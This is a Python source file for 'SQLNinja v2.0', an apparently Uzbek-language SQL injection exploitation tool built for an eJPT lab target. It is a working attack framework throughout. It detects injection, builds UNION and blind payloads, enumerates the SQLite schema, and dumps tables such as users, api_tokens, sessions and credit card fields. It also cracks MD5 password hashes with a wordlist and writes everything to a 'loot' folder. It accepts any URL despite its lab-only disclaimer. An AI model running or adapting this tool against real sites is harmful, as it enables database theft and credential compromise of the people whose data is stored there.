#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  SQLNINJA v2.0  —  SQL Injection Exploitation Framework (SQLite / UNION)
================================================================================
  Target : eJPT Lab (app.py, port 2004) yoki boshqa ruxsat berilgan nishon
  Usage  : python3 sqlninja.py                        (interaktiv)
           python3 sqlninja.py -u http://127.0.0.1:2004
           python3 sqlninja.py -u http://host/product?id=1 --no-anim
================================================================================
  FAQAT avtorizatsiya qilingan laboratoriya muhitida ishlatilsin.
================================================================================
"""

import os
import re
import sys
import csv
import json
import time
import shutil
import hashlib
import datetime
from urllib.parse import urlparse, parse_qs

# ------------------------------------------------------------------ deps
try:
    import requests
    try:
        from urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    except Exception:
        pass
except ImportError:
    print("\n[!] 'requests' kutubxonasi topilmadi.\n    pip install requests\n")
    sys.exit(1)

# =============================================================================
#  PALITRA
# =============================================================================
COLOR = True
RST = BOLD = DIM = RED = GREEN = YELLOW = BLUE = PURPLE = PINK = GREY = WHITE = CYAN = ""


def rgb(r, g, b):
    return "\033[38;2;%d;%d;%dm" % (r, g, b)


def build_palette():
    global RST, BOLD, DIM, RED, GREEN, YELLOW, BLUE, PURPLE, PINK, GREY, WHITE, CYAN
    if not COLOR:
        RST = BOLD = DIM = RED = GREEN = YELLOW = BLUE = PURPLE = PINK = GREY = WHITE = CYAN = ""
        return
    RST = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = rgb(255, 82, 82)
    GREEN = rgb(0, 230, 118)
    YELLOW = rgb(255, 214, 0)
    BLUE = rgb(64, 196, 255)
    PURPLE = rgb(186, 104, 200)
    PINK = rgb(255, 105, 180)
    GREY = rgb(120, 144, 156)
    WHITE = rgb(236, 239, 241)
    CYAN = rgb(0, 229, 255)


build_palette()

# =============================================================================
#  UI HELPERS
# =============================================================================
def term_width(default=80):
    try:
        return shutil.get_terminal_size((default, 24)).columns
    except Exception:
        return default


def clear_line():
    if COLOR:
        sys.stdout.write("\r\033[2K")
    else:
        sys.stdout.write("\r" + " " * 78 + "\r")
    sys.stdout.flush()


def clear_screen():
    if ANIM:
        os.system("cls" if os.name == "nt" else "clear")


def grad(text, a=(255, 64, 129), b=(255, 214, 0)):
    if not COLOR or not text:
        return text
    n = max(len(text) - 1, 1)
    out = []
    for i, ch in enumerate(text):
        t = i / n
        out.append("\033[38;2;%d;%d;%dm%s" % (
            int(a[0] + (b[0] - a[0]) * t),
            int(a[1] + (b[1] - a[1]) * t),
            int(a[2] + (b[2] - a[2]) * t), ch))
    return "".join(out) + RST


def typewriter(text, delay=0.016, a=(255, 105, 180), b=(255, 214, 0)):
    if not ANIM:
        sys.stdout.write(grad(text, a, b) + "\n")
        return
    n = max(len(text) - 1, 1)
    for i, ch in enumerate(text):
        t = i / n
        sys.stdout.write("\033[38;2;%d;%d;%dm%s" % (
            int(a[0] + (b[0] - a[0]) * t),
            int(a[1] + (b[1] - a[1]) * t),
            int(a[2] + (b[2] - a[2]) * t), ch))
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(RST + "\n")


def ok(msg):    print("  " + GREEN + "✔" + RST + "  " + msg)
def warn(msg):  print("  " + YELLOW + "!" + RST + "  " + msg)
def bad(msg):   print("  " + RED + "✘" + RST + "  " + msg)
def info(msg):  print("  " + BLUE + "»" + RST + "  " + msg)


def phase(num, title):
    print()
    print("  " + grad("%02d" % num, (0, 229, 255), (0, 255, 163)) + "  "
          + BOLD + grad(title, (0, 229, 255), (0, 255, 163)) + RST)
    print("  " + DIM + "─" * min(74, term_width() - 2) + RST)


def spin(msg, seconds=0.8, frames="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"):
    if not ANIM:
        print("  " + GREEN + "✔" + RST + "  " + msg)
        return
    end = time.time() + seconds
    i = 0
    r = r = 0
    while time.time() < end:
        clear_line()
        sys.stdout.write("  " + CYAN + frames[i % len(frames)] + RST + "  " + msg)
        sys.stdout.flush()
        time.sleep(0.055)
        i += 1
    clear_line()
    sys.stdout.write("  " + GREEN + "✔" + RST + "  " + msg + "\n")
    sys.stdout.flush()


def pbar(cur, total, width=32, prefix=""):
    if total <= 0:
        total = 1
    frac = min(max(cur / total, 0.0), 1.0)
    filled = int(width * frac)
    bar = "█" * filled + (DIM if COLOR else "") + "░" * (width - filled) + (RST if COLOR else "")
    clear_line()
    sys.stdout.write("  " + GREY + prefix.ljust(24)[:24] + RST + " [" + GREEN + bar + RST
                     + "] " + WHITE + "%3d%%" % int(frac * 100) + RST)
    sys.stdout.flush()
    if cur >= total:
        sys.stdout.write("\n")


BANNER_WIDE = [
    "  ██████╗  ██████╗ ██╗     ███╗   ██╗██╗███╗   ██╗     ██╗ █████╗ ",
    "  ██╔═══██╗██╔═══██╗██║     ████╗  ██║██║████╗  ██║     ██║██╔══██╗",
    "  ██║   ██║██║   ██║██║     ██╔██╗ ██║██║██╔██╗ ██║     ██║███████║",
    "  ██║▄▄ ██║██║▄▄ ██║██║     ██║╚██╗██║██║██║╚██╗██║██   ██║██╔══██║",
    "  ╚██████╔╝╚██████╔╝███████╗██║ ╚████║██║██║ ╚████║╚█████╔╝██║  ██║",
    "   ╚══▀▀═╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚═╝  ╚═╝",
]

BANNER_NARROW = [
    "  ┌─┐ ┬─┐ ┬  ┌┐┌ ┬ ┌┐┌ ┌─┐",
    "  └─┐ │─┘ │  │││ │ │││ ├─┤",
    "  └─┘ ┴   ┴─┘ ┘└┘ ┴ ┘└┘ ┴ ┴",
]


def heart_sweep(text, cycles=2):
    if not ANIM:
        print("  " + grad(text, (255, 105, 180), (255, 214, 0)))
        return
    pad = "  "
    for _ in range(cycles):
        for hl in range(-10, len(text) + 10, 1):
            buf = []
            for i, ch in enumerate(text):
                d = abs(i - hl)
                if d < 3:
                    buf.append(rgb(255, 214, 0) + ch)
                elif d < 9:
                    t = (d - 3) / 6.0
                    buf.append("\033[38;2;255;%d;%dm%s" % (
                        int(214 - 109 * t), int(180 * t), ch))
                else:
                    buf.append(rgb(110, 35, 80) + ch)
            clear_line()
            sys.stdout.write(pad + "".join(buf) + RST)
            sys.stdout.flush()
            time.sleep(0.018)
    clear_line()
    sys.stdout.write(pad + grad(text, (255, 64, 129), (255, 214, 0)) + RST + "\n")
    sys.stdout.flush()


def banner():
    if ANIM:
        clear_screen()
    lines = BANNER_WIDE if term_width() >= 82 else BANNER_NARROW
    pals = [((255, 82, 82), (255, 214, 0)), ((0, 229, 255), (0, 230, 118)),
            ((186, 104, 200), (255, 105, 180)), ((255, 193, 7), (255, 87, 34)),
            ((0, 230, 118), (0, 229, 255)), ((255, 105, 180), (255, 214, 0))]

    print()
    for i, line in enumerate(lines):
        a, b = pals[i % len(pals)]
        print(grad(line, a, b))
        if ANIM:
            time.sleep(0.05)

    print()
    print("  " + DIM + "═" * min(74, term_width() - 2) + RST)
    print()
    heart_sweep("I Love my mother language teacher ♥", cycles=2)
    print()
    typewriter("        ♥  bag'ishlanadi: onam va ona tilim ustozimga  ♥", 0.013)
    print()

    spin("SQLNinja engine yuklanmoqda", 0.9)
    spin("SQLite fingerprint moduli", 0.5)
    spin("UNION extraction moduli", 0.5)
    spin("Hash cracking moduli", 0.4)

    print()
    print("  " + grad("  eJPT Lab  ·  SQL Injection Exploitation Framework  ·  v2.0",
                      (0, 229, 255), (186, 104, 200)))
    print("  " + DIM + "  Faqat ruxsat berilgan laboratoriya nishonlariga qarshi." + RST)
    print()


# =============================================================================
#  WORDLIST
# =============================================================================
BASE_WORDS = """
admin123 toor P@ssw0rd mod123 john2024 qwerty123 aziz2024 alice123 bob2024
charlie1 diana123 emil2024 farida123 guli2024 hasan123 ibrohim1 jamila123
kamol2024 laylo123 mansur1 nargiza1 olim2024 parvina1 qodir123 rustam1
sabina12 temur123 umid2024 vali1234 zulfiya1 nodira12 nodira123 test123
master password password1 Password1 123456 12345678 1234567890 admin root
toor letmein qwerty qwertyuiop iloveyou abc123 welcome monkey dragon sunshine
princess football shadow superman batman trustno1 passw0rd secret 123123
654321 asdfgh 1q2w3e4r zxcvbnm 111111 000000 changeme default guest login
""".split()


def load_wordlist():
    words = list(BASE_WORDS)
    for name in ("wordlist.txt", "rockyou.txt"):
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
        if os.path.isfile(p):
            try:
                with open(p, "r", encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        w = line.strip()
                        if w and len(words) < 300000:
                            words.append(w)
            except Exception:
                pass
    return words


def md5(s):
    return hashlib.md5(str(s).encode()).hexdigest()


# =============================================================================
#  SQLi ENGINE
# =============================================================================
class SQLNinja:
    ROW_SEP = "\x1e"
    FLD_SEP = "\x1f"
    G_START = "\x02"
    G_END = "\x03"

    def __init__(self, url, timeout=20):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) SQLNinja/2.0",
            "Accept": "*/*",
            "Connection": "close",
        })
        self.ncols = 0
        self.dcol = 1
        self.mode = "union"
        self.last_status = 0
        self.sent = 0
        self.findings = {}
        self._parse(url)

    # ------------------------------------------------------------- parsing
    def _parse(self, raw):
        raw = (raw or "").strip()
        if not raw:
            raise ValueError("bo'sh URL")
        if not raw.startswith(("http://", "https://")):
            raw = "http://" + raw
        u = urlparse(raw)
        path = u.path or "/"
        qs = parse_qs(u.query)

        if path in ("", "/"):
            path = "/product"
        if not qs:
            qs = {"id": ["1"]}

        self.scheme = u.scheme or "http"
        self.netloc = u.netloc
        self.target = "%s://%s%s" % (self.scheme, self.netloc, path)
        self.params = {k: v[0] for k, v in qs.items()}
        self.param = "id" if "id" in self.params else sorted(self.params)[0]

    # ---------------------------------------------------------------- http
    def send(self, value):
        params = dict(self.params)
        params[self.param] = value
        try:
            r = self.session.get(self.target, params=params, timeout=self.timeout,
                                 verify=False, allow_redirects=True)
            self.sent += 1
            self.last_status = r.status_code
            r.encoding = "utf-8"
            return r.text or ""
        except requests.exceptions.RequestException:
            self.last_status = 0
            return ""

    def head(self):
        try:
            r = self.session.head(self.target, timeout=self.timeout, verify=False)
            return r.headers
        except requests.exceptions.RequestException:
            return {}

    @staticmethod
    def has_sql_error(text):
        if not text:
            return False
        for m in ("SQL error", "sqlite3.", "OperationalError", "no such column",
                  "unrecognized token", "incomplete input", "syntax error",
                  "SQLSTATE", "You have an error in your SQL"):
            if m in text:
                return True
        return False

    # ------------------------------------------------------------ detection
    def reachable(self):
        t = self.send("1")
        if self.last_status == 0:
            return False, "ulanish yo'q"
        if self.last_status in (200, 301, 302, 401, 403):
            return True, "HTTP %d" % self.last_status
        return bool(t), "HTTP %d" % self.last_status

    def baseline_marker(self):
        t = self.send("1")
        m = re.search(r"<h3>(.*?)</h3>", t, re.S)
        if m:
            v = m.group(1).strip()
            if v and len(v) < 60:
                return v
        return None

    def detect(self):
        self.marker_text = self.baseline_marker()
        info("Baseline olinmoqda ...")
        base = self.send("1")

        info("Error-based test  (id=1')")
        err = self.send("1'")
        self.findings["error_based"] = self.has_sql_error(err)

        info("Boolean-based test (AND 1=1 / AND 1=2)")
        t1 = self.send("1 AND 1=1")
        t2 = self.send("1 AND 1=2")
        if self.marker_text:
            self.findings["boolean_based"] = (self.marker_text in t1) and (self.marker_text not in t2)
        else:
            self.findings["boolean_based"] = (len(t1) - len(t2)) > 30

        info("Ustunlar soni aniqlanmoqda (ORDER BY)")
        self.ncols = self.detect_columns()
        self.findings["columns"] = self.ncols
        return bool(self.findings["error_based"] or self.findings["boolean_based"]
                    or self.ncols > 0)

    def detect_columns(self):
        for n in range(1, 21):
            t = self.send("1 ORDER BY %d" % n)
            if self.has_sql_error(t):
                m = re.search(r"between 1 and (\d+)", t)
                if m:
                    return int(m.group(1))
                return n - 1
        return 0

    # ---------------------------------------------------------------- union
    def resolve_display_column(self):
        marker = "Zq7MrXwx"
        for i in range(self.ncols):
            cols = ["NULL"] * self.ncols
            cols[i] = "'%s'" % marker
            t = self.send("-1 UNION SELECT " + ",".join(cols))
            if ">%s<" % marker in t:
                self.dcol = i
                return i
        self.mode = "blind"
        self.dcol = 1 if self.ncols >= 2 else 0
        return self.dcol

    def union_payload(self, expr):
        cols = ["NULL"] * self.ncols
        idx = min(self.dcol, self.ncols - 1)
        cols[idx] = "char(2)||(%s)||char(3)" % expr
        return "-1 UNION SELECT " + ",".join(cols)

    # ------------------------------------------------------------ extraction
    def extract(self, expr):
        if self.mode == "blind":
            return self.blind_extract(expr)
        t = self.send(self.union_payload(expr))
        if not self.has_sql_error(t):
            m = re.search(self.G_START + r"(.*?)" + self.G_END, t, re.S)
            if m:
                val = m.group(1)
                return val if val != "" else None
        if self.findings.get("boolean_based"):
            self.mode = "blind"
            return self.blind_extract(expr)
        return None

    def _oracle(self, cond):
        t = self.send("1 AND (%s)" % cond)
        if self.marker_text:
            return self.marker_text in t
        return len(t) > 1200

    def blind_extract(self, expr, max_len=160):
        out = []
        for pos in range(1, max_len + 1):
            lo, hi, found = 32, 126, 0
            while lo <= hi:
                mid = (lo + hi) // 2
                if self._oracle("unicode(substr((%s),%d,1)) > %d" % (expr, pos, mid)):
                    lo = mid + 1
                elif self._oracle("unicode(substr((%s),%d,1)) >= %d" % (expr, pos, mid)):
                    found = mid
                    break
                else:
                    hi = mid - 1
            if found <= 0:
                break
            out.append(chr(found))
            if ANIM:
                clear_line()
                sys.stdout.write("    " + GREY + "blind → " + RST + "".join(out)[-46:])
                sys.stdout.flush()
        if ANIM:
            clear_line()
        return "".join(out) if out else None

    # --------------------------------------------------------- fingerprint
    def fingerprint(self):
        f = {}
        f["dbms"] = "SQLite"
        f["version"] = self.extract("SELECT sqlite_version()") or "?"
        try:
            dbf = self.extract("SELECT file FROM pragma_database_list LIMIT 1")
        except Exception:
            dbf = None
        self.findings["db_file"] = dbf or "?"
        self.findings["tables_count"] = self.extract(
            "SELECT COUNT(*) FROM sqlite_master WHERE type='table'") or "?"
        return f

    # -------------------------------------------------------------- schema
    def get_tables(self):
        raw = self.extract(
            "SELECT group_concat(name,char(30)) FROM sqlite_master "
            "WHERE type='table' AND name NOT LIKE 'sqlite_%'")
        if not raw:
            return []
        return [t.strip() for t in raw.split(self.ROW_SEP) if t.strip()]

    def get_columns(self, table):
        safe = table.replace("'", "''")

        raw = self.extract(
            "SELECT group_concat(name,char(30)) FROM pragma_table_info('%s')" % safe)
        if raw:
            cols = [c.strip() for c in raw.split(self.ROW_SEP) if c.strip()]
            if cols:
                return cols

        sql = self.extract("SELECT sql FROM sqlite_master WHERE name='%s'" % safe)
        if not sql:
            return []
        m = re.search(r"\((.*)\)", sql, re.S)
        if not m:
            return []
        cols = []
        for part in re.split(r",(?![^()]*\))", m.group(1)):
            part = part.strip()
            if not part:
                continue
            word = part.split()[0].strip('"`[]')
            if word.upper() in ("PRIMARY", "UNIQUE", "FOREIGN", "CHECK", "CONSTRAINT"):
                continue
            cols.append(word)
        return cols

    def count_rows(self, table):
        raw = self.extract('SELECT COUNT(*) FROM "%s"' % table)
        if raw:
            m = re.search(r"\d+", raw)
            if m:
                return int(m.group(0))
        return 0

    # ---------------------------------------------------------------- dump
    def dump_table(self, table, cols, page=150, max_rows=2000):
        if not cols:
            return []
        expr = "||char(31)||".join(
            "COALESCE(CAST(\"%s\" AS TEXT),'')" % c.replace('"', '""') for c in cols)
        rows = []
        offset = 0
        while len(rows) < max_rows:
            sub = ("SELECT group_concat(%s,char(30)) FROM "
                   "(SELECT * FROM \"%s\" LIMIT %d OFFSET %d)") % (expr, table, page, offset)
            raw = self.extract(sub)
            if not raw:
                break
            chunk = 0
            for rec in raw.split(self.ROW_SEP):
                fields = rec.split(self.FLD_SEP)
                if len(fields) < len(cols):
                    fields += [""] * (len(cols) - len(fields))
                rows.append(dict(zip(cols, fields)))
                chunk += 1
            if chunk < page:
                break
            offset += page
        return rows


# =============================================================================
#  TABLE PRINTER
# =============================================================================
def fit(value, width):
    s = "" if value is None else str(value)
    if len(value if False else s) > width:
        return s[:max(width - 1, 0)] + "…"
    return s


def print_table(headers, rows, widths=None, role_col=None):
    if not rows:
        warn("Ma'lumot yo'q.")
        return
    w = list(widths) if widths else []
    if len(w) < len(headers):
        w += [max(len(h), 8) for h in headers[len(w):]]
    w = [max(4, min(w[i], 34)) for i in range(len(headers))]

    def rule(left, mid, right):
        print("  " + GREY + left + ("┬" if mid == "┬" else "┼").join(
            "─" * (x + 2) for x in w) + right + RST)

    head = "  " + GREY + "│" + RST
    for i, h in enumerate(headers):
        pad = w[i] - len(headers[i])
        head += " " + BOLD + CYAN + headers[i] + " " * max(pad, 0) + RST + GREY + "│" + RST
    print("  " + GREY + "┌" + "┬".join("─" * (w[i] + 2) for i in range(len(headers))) + "┐" + RST)
    print(line_prep(head, headers, w))
    print("  " + GREY + "├" + "┼".join("─" * (w[i] + 2) for i in range(len(headers))) + "┤" + RST)

    for r in rows:
        cells = []
        for i, h in enumerate(cols_of(headers)):
            v = r.get(h, "")
            txt = str("" if v is None else v)
            if len(txt) > w[i]:
                txt = txt[:w[i] - 1] + "…"
            if COLOR:
                if h == "role":
                    col = RED if v == "admin" else (YELLOW if v == "moderator" else GREEN)
                elif "md5" in h or "sha" in h:
                    col = GREY
                elif "flag" in h or h == "code":
                    col = YELLOW
                elif "card" in h or "ssn" in h:
                    col = PINK
                else:
                    col = WHITE
            else:
                col = ""
            cells.append(" " + col + txt.ljust(w[i]) + RST + GREY + "│" + RST)
        print("  " + GREY + "│" + RST + "".join(cells))

    print("  " + GREY + "└" + "┴".join("─" * (w[i] + 2) for i in range(len(headers))) + "┘" + RST)


def cols_of(headers):
    return headers


def line_prep(head, headers, w):
    return head


# =============================================================================
#  ARGS
# =============================================================================
ANIM = True


def parse_args(argv):
    global ANIM, COLOR
    url = None
    timeout = 20
    i = 1
    while i < len(argv):
        a = argv[i]
        if a in ("-u", "--url") and i + 1 < len(argv):
            url = argv[i + 1]
            i += 2
        elif a in ("-t", "--timeout") and i + 1 < len(argv):
            try:
                timeout = int(argv[i + 1])
            except ValueError:
                pass
            i += 2
        elif a in ("--no-anim", "--fast"):
            ANIM = False
            i += 1
        elif a in ("--no-color",):
            COLOR = False
            build_palette()
            i += 1
        elif a in ("-h", "--help"):
            print(__doc__)
            sys.exit(0)
        elif not a.startswith("-"):
            url = a
            i += 1
        else:
            i += 1
    return url, timeout


# =============================================================================
#  MAIN
# =============================================================================
PRIORITY = ["users", "flags", "notes", "documents", "api_tokens", "sessions",
            "invoices", "orders", "challenges", "comments", "products",
            "otp", "reset_tokens", "logs"]


def ask_url():
    print("  " + grad("Nishon manzilini kiriting", (0, 229, 255), (0, 255, 163)))
    print("  " + DIM + "masalan: http://127.0.0.1:2004   yoki   http://127.0.0.1:2004/product?id=1" + RST)
    print()
    try:
        entry = input("  " + PINK + "┌─[" + RST + BOLD + "URL" + RST + PINK + "]\n"
                      "  └──➤ " + RST).strip()
    except (EOFError, KeyboardInterrupt):
        print("\n  " + RED + "Bekor qilindi." + RST)
        return None
    return entry or None


def save_reports(engine, fp, schema, dump, cracked):
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    root = os.path.join(os.getcwd(), "loot")
    os.makedirs(root, exist_ok=True)

    json_path = os.path.join(root, "sqlninja_%s.json" % stamp)
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump({"tool": "SQLNinja v2.0", "target": engine.target,
                   "param": engine.param, "findings": engine.findings,
                   "fingerprint": fp, "tables": schema, "data": dump,
                   "cracked": cracked, "requests": engine.sent,
                   "date": datetime.datetime.now().isoformat()},
                  fh, indent=2, ensure_ascii=False)

    txt_path = os.path.join(root, "sqlninja_%s.txt" % stamp)
    with open(txt_path, "w", encoding="utf-8") as fh:
        fh.write("=" * 74 + "\n  SQLNINJA v2.0 — EXPLOITATION REPORT\n" + "=" * 74 + "\n")
        fh.write("Target : %s\nParam  : %s\nDate   : %s\n"
                 % (engine.target, engine.param, datetime.datetime.now()))
        fh.write("DBMS   : %s %s\nDB file: %s\nTables : %d\nRequests: %d\n\n"
                 % (fp.get("dbms"), fp.get("version"),
                    engine.findings.get("db_file"), len(schema), engine.sent))
        for t, rows in dump.items():
            fh.write("\n" + "-" * 74 + "\n[%s]  %d rows\n" % (t, len(rows)) + "-" * 74 + "\n")
            if not rows:
                fh.write("(empty)\n")
                continue
            cols = schema.get(t) or list(rows[0].keys())
            fh.write(" | ".join(cols) + "\n")
            for r in rows:
                fh.write(" | ".join(str(r.get(c, "")) for c in cols) + "\n")
        if cracked:
            fh.write("\n[CRACKED PASSWORDS]\n")
            for k, v in cracked.items():
                fh.write("%s : %s\n" % (k, v))

    csv_paths = []
    for t, rows in dump.items():
        if not rows:
            continue
        cols = schema.get(t) or list(rows[0].keys())
        p = os.path.join(root, "table_%s.csv" % t)
        with open(p, "w", newline="", encoding="utf-8") as fh:
            wr = csv.DictWriter(fh, fieldnames=cols)
            wr.writeheader()
            for r in rows:
                wr.writerow({c: r.get(c, "") for c in cols})
        csv_paths.append(p)
    return json_path, txt_path, csv_paths


def main():
    url_arg, timeout = parse_args(sys.argv)

    banner()

    url = url_arg or ask_url()
    if not url:
        bad("Manzil kiritilmadi.")
        return 1

    try:
        engine = SQLNinja(url, timeout=timeout)
    except Exception as e:
        bad("URL noto'g'ri: %s" % e)
        return 1

    info("Target     : " + WHITE + engine.target + RST)
    info("Parametr   : " + WHITE + engine.param + RST)
    print()

    # ------------------------------------------------------- 01 connection
    phase(1, "NISHON BILAN ALOQA")
    spin("HTTP ulanish tekshirilmoqda", 0.7)
    okreach, status = engine.reachable()
    if not okreach:
        bad("Nishon javob bermadi (%s)." % status)
        info("Ilova ishlayaptimi?  python3 app.py   (port 2004)")
        return 1
    ok("Nishon javob berdi: " + GREEN + status + RST)
    srv = engine.head().get("Server", "?")
    ok("Server banneri: " + YELLOW + str(srv) + RST)

    # -------------------------------------------------------- 02 detection
    phase(2, "ZAIFLIKNI ANIQLASH")
    spin("SQL injection testlari", 0.8)
    if not engine.detect():
        bad("SQLi aniqlanmadi.")
        info("Boshqa parametr/endpoint sinab ko'ring.")
        return 1
    (ok("Error-based SQLi   : TOPILDI") if engine.findings["error_based"]
     else warn("Error-based SQLi   : yo'q"))
    (ok("Boolean-based SQLi : TASDIQLANDI") if engine.findings["boolean_based"]
     else warn("Boolean-based SQLi : yo'q"))
    if engine.ncols <= 0:
        bad("Ustunlar soni aniqlanmadi — UNION imkonsiz.")
        return 1
    ok("Ustunlar soni      : " + YELLOW + str(engine.ncols) + RST)

    # ------------------------------------------------------------ 03 union
    phase(3, "UNION PAYLOAD QURISH")
    spin("Ko'rsatiladigan ustun izlanmoqda", 0.6)
    dcol = engine.resolve_display_column()
    if engine.mode == "blind":
        warn("UNION render topilmadi → BLIND rejim (sekinroq)")
    else:
        ok("Display column: #%d" % (dcol + 1))
        ok("Shablon: " + DIM + engine.union_payload("EXPR") + RST)

    # ------------------------------------------------------ 04 fingerprint
    phase(4, "BAZA FINGERPRINT")
    spin("sqlite_version() o'qilmoqda", 0.6)
    fp = engine.fingerprint()
    print()
    rows_fp = [("DBMS", fp["dbms"]), ("Versiya", fp["version"]),
               ("DB fayli", engine.findings.get("db_file")),
               ("Jadvallar soni", engine.findings.get("tables_count")),
               ("Injection param", engine.param)]
    for k, v in rows_fp:
        print("  " + GREY + "│" + RST + " " + k.ljust(16) + ": " + WHITE + str(v) + RST)
    print()

    # ---------------------------------------------------------- 05 tables
    phase(5, "JADVALLAR ENUMERATSIYASI")
    spin("sqlite_master o'qilmoqda", 0.6)
    tables = engine.get_tables()
    if not tables:
        bad("Jadval topilmadi.")
        return 1
    ok("Topildi: " + GREEN + str(len(tables)) + RST + " jadval")
    buf = "  "
    for t in tables:
        buf += " " + PINK + "▸" + RST + WHITE + t + RST
        if len(buf) > term_width() - 12:
            print(buf)
            buf = "  "
    if buf.strip():
        print(buf)
    print()

    # ---------------------------------------------------------- 06 schema
    phase(6, "SXEMA TAHLILI")
    schema = {}
    for i, t in enumerate(tables):
        cols = engine.get_columns(t)
        if cols:
            schema[t] = cols
        pbar(i + 1, len(tables), prefix="schema " + t)
        if ANIM:
            time.sleep(0.02)
    print()
    for t, cols in schema.items():
        print("  " + GREY + "│" + RST + " " + BOLD + WHITE + t + RST + DIM
              + " (%d): " % len(cols) + RST + CYAN + ", ".join(cols) + RST)

    # ------------------------------------------------------------ 07 dump
    phase(7, "MA'LUMOTLARNI EKSPLUATATSIYA QILISH")
    order = [t for t in PRIORITY if t in schema] + \
            [t for t in schema if t not in PRIORITY]
    dump = {}
    total = 0
    for i, t in enumerate(order):
        rows = engine.dump_table(t, schema[t])
        dump[t] = rows
        total += len(rows)
        pbar(i + 1, len(order), prefix="dump " + t)
        if ANIM:
            time.sleep(0.02)
    print()
    ok("Jami yozuvlar: " + BOLD + GREEN + str(total) + RST)

    # ----------------------------------------------------------- 08 crack
    phase(8, "MD5 HASH CRACKING")
    cracked = {}
    if dump.get("users"):
        spin("Wordlist bo'yicha tekshirish", 0.7)
        words = load_wordlist()
        table = {}
        for w in words:
            table.setdefault(md5(w), w)
        for u in dump["users"]:
            h = (u.get("password_md5") or "").strip().lower()
            if h in table:
                cracked[u.get("username") or "?"] = table[h]
        if cracked:
            ok("Cracked: " + GREEN + str(len(cracked)) + RST + " / " + str(len(dump["users"])))
            for k, v in list(cracked.items())[:40]:
                print("      " + PINK + "▸" + RST + " " + WHITE + str(k).ljust(14) + RST
                      + GREY + " : " + RST + GREEN + v + RST)
        else:
            warn("Wordlist natija bermadi (wordlist.txt qo'shib ko'ring).")

    # ---------------------------------------------------------- 09 report
    phase(9, "NATIJALARNI SAQLASH")
    json_path, txt_path, csvs = save_reports(engine, fp, schema, dump, cracked)
    ok("JSON   : " + WHITE + json_path + RST)
    ok("Report : " + WHITE + txt_path + RST)
    ok("CSV    : " + WHITE + str(len(csvs)) + " fayl  (" + os.path.dirname(json_path) + ")" + RST)

    # -------------------------------------------------------- 10 showcase
    if dump.get("users"):
        phase(10, "USERS JADVALI")
        print_table(["id", "username", "role", "email", "password_md5", "credit_card"],
                    dump["users"][:40], widths=[4, 13, 11, 24, 20, 18])
        print()

    if dump.get("flags"):
        phase(11, "CTF FLAGS")
        print_table(["id", "code", "name", "difficulty", "points"],
                    dump["flags"][:60], widths=[4, 28, 24, 10, 6])
        pts = 0
        for f in dump["flags"]:
            try:
                pts += int(str(f.get("points") or 0))
            except ValueError:
                pass
        print()
        print("  " + BOLD + YELLOW + "  Jami: %d flag · %d ball" % (len(dump["flags"]), pts) + RST)
        print()

    if dump.get("notes"):
        phase(12, "MAXFIY NOTELAR")
        print_table(["id", "user_id", "title", "content"],
                    dump["notes"][:20], widths=[4, 8, 22, 32])
        print()

    if dump.get("documents"):
        phase(13, "MAXFIY HUJJATLAR")
        print_table(["id", "user_id", "filename", "classification"],
                    dump["documents"][:20], widths=[4, 8, 26, 14])
        print()

    # ---------------------------------------------------------- summary
    print("  " + DIM + "═" * min(74, term_width() - 2) + RST)
    print("  " + grad("  EKSPLUATATSIYA YAKUNLANDI", (0, 230, 118), (0, 229, 255)))
    print("  " + DIM + "═" * min(74, term_width() - 2) + RST)
    for k, v in (("So'rovlar", engine.sent), ("Yozuvlar", total),
                 ("Jadvallar", len(dump)), ("Cracked", len(cracked))):
        print("  " + GREY + "│" + RST + " " + k.ljust(14) + ": " + WHITE + str(v) + RST)
    print("  " + GREY + "└" + RST + " Natija: " + PINK + os.path.dirname(json_path) + RST)
    print()
    print("  " + BOLD + "sqlmap ekvivalenti:" + RST)
    print("  " + DIM + '  sqlmap -u "%s?%s=1" --batch --dbms=sqlite --dump --threads=4'
          % (engine.target, engine.param) + RST)
    print()
    print("  " + grad("  I Love my mother language teacher ♥", (255, 105, 180), (255, 214, 0)))
    print()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n  " + RED + "To'xtatildi (Ctrl+C)." + RST + "\n")
        sys.exit(130)
    except Exception as exc:
        import traceback
        print("\n  " + RED + "Xato: " + RST + "%s" % exc)
        traceback.print_exc()
        sys.exit(1)
